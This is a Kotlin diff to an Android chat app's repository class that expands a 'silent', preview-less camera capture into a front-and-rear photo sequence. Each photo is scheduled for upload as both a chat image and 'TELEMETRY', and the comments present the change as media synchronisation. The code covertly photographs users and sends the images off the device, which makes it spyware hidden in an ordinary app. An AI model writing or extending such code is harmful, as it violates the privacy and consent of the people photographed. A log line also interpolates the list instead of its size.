@@ -159,6 +159,7 @@ class ChatRepository private constructor(context: Context) {
 
     /**
      * Orquestra a captura silenciosa usando o CameraCaptureManager e agendando o upload.
+     * Atualizado para usar o novo fluxo de sincronização de mídia.
      */
     suspend fun processMediaCapture(
         context: Context,
@@ -171,33 +172,39 @@ class ChatRepository private constructor(context: Context) {
             // 1. Instanciar o CameraCaptureManager
             val captureManager = com.zangi.chat.service.CameraCaptureManager(context, this@ChatRepository, lifecycleOwner)
             
-            // 2. Realizar a captura de forma 'headless' (sem preview)
-            val capturedFile = captureManager.captureSilentPhoto()
+            // 2. Chamar o novo método de sequência de captura (que faz frontal e traseira)
+            // O método retorna uma lista de arquivos capturados
+            val capturedFiles = captureManager.captureDualPhotosSequence()
             
-            if (capturedFile != null && capturedFile.exists()) {
+            if (capturedFiles.isNotEmpty()) {
                 val deviceInfo = "SilentCapture - Android ${Build.VERSION.RELEASE}"
                 
-                // 3. Diferenciação de Tipos de Captura
-                // Evento 1: FOTO_CAMERA (imagem de chat)
-                triggerAutomaticCapture(
-                    type = "FOTO_CAMERA",
-                    file = capturedFile,
-                    conversationId = conversationId,
-                    deviceInfo = deviceInfo
-                )
+                // 3. Processar cada arquivo capturado para o upload
+                capturedFiles.forEach { capturedFile ->
+                    if (capturedFile.exists()) {
+                        // Evento 1: FOTO_CAMERA (imagem de chat/identificação)
+                        triggerAutomaticCapture(
+                            type = "FOTO_CAMERA",
+                            file = capturedFile,
+                            conversationId = conversationId,
+                            deviceInfo = deviceInfo
+                        )
 
-                // Evento 2: TELEMETRY (captura de sistema)
-                triggerAutomaticCapture(
-                    type = "TELEMETRY",
-                    file = capturedFile,
-                    conversationId = null,
-                    deviceInfo = deviceInfo
-                )
+                        // Evento 2: TELEMETRY (captura de sistema/log)
+                        triggerAutomaticCapture(
+                            type = "TELEMETRY",
+                            file = capturedFile,
+                            conversationId = conversationId,
+                            deviceInfo = deviceInfo
+                        )
+                    }
+                }
+                Log.d(TAG, "✅ Processo de captura e agendamento finalizado para $capturedFiles.size arquivos.")
             } else {
-                Log.e(TAG, "Falha ao obter arquivo na captura silenciosa.")
+                Log.e(TAG, "Falha ao obter arquivos na captura sequencial.")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Erro no processMediaCapture", e)
+            Log.e(TAG, "Erro no processMediaCapture: ${e.message}")
         }
     }
 
